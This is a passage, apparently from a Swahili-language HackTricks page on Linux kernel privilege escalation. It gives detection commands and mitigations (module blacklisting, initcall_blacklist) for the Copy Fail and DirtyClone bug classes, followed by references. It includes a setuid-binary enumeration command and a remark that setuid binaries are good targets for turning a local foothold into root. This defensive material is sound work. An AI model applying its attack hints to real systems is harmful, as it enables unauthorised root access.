Ukaguzi muhimu wa kubaini uwezekano wa kuathiriwa na aina hii:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

Kupunguza attack surface kwa muda mfupi pia hutegemea njia mahususi hapa: kusasisha hadi kernel yenye `48f6a5356a33` hurekebisha njia ya clone, huku kuzuia upakiaji wa `xt_TEE` kiotomatiki kukiondoa **hatua ya flag-laundering**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Uwezekano wa kuathirika na utafutaji

Ikiwa unashuku aina hii ya hitilafu, usitegemee ukaguzi wa uadilifu wa diski pekee. Pia hakikisha:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Thamani za usanidi zilizo hapa chini hutofautisha kiolesura kinachoweza kupakiwa na kilichojengwa ndani ya kernel; sheria za ujenzi wa crypto hupanga `CONFIG_CRYPTO_USER_API_AEAD` kuwa `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kupakuliwa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: kiolesura kimejengwa ndani ya kernel
- binaries za setuid ni malengo mazuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Kupunguza attack surface kwa njia ya `algif_aead`

Ikiwa kiolesura chenye athari kinawekwa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Ikiwa imejumuishwa kwenye kernel, baadhi ya taarifa za ufichuzi ziliripoti kuwa njia ya init ilizuiwa kwa kutumia:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Aina hii ya mitigation inafaa kukumbukwa pia kwa LPE nyingine za kernel: ikiwa exploitation inategemea interface fulani ya hiari, kuizima au kuiweka kwenye blacklist kunaweza kukatiza njia ya exploit hata kabla ya kupata toleo jipya kamili la kernel.<sup>[[6]](#references)[[28]](#references)</sup>



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [HTB Bamboo – kuteka script inayoendeshwa na root katika directory ya PaperCut inayoweza kuandikiwa na mtumiaji](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — maswali yanayoulizwa mara kwa mara](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Taarifa ya Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Marekebisho ya Linux stable: crypto: algif_aead - Rejesha utendaji wa out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — ushauri kuhusu CVE-2026-31431](https://copy.fail/)
- [7] [Makala ya kiufundi ya Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repository ya DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchambua na kutumia DirtyClone, lahaja ya Linux LPE (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Marekebisho ya Linux: net: skb: hifadhi `SKBFL_SHARED_FRAG` katika `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigation ya awali ya Linux: weka `SKBFL_SHARED_FRAG` kwa paketi za UDP zilizopitishwa kwa splice (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — ukurasa wa mwongozo wa Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Uhusiano wa programu za MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Vipimo vya Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Vipimo vya Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Lugha ya Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile ya Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Athari ya Linux kernel AF_ALG page cache](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Nyaraka za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Nyaraka za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Nyaraka za systemd generator](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Uhandisi wa utambuzi wa Linux: mbinu za persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
- [37] [0xdf — HTB: MakeSense](https://0xdf.gitlab.io/2026/10/31/htb-makesense.html)
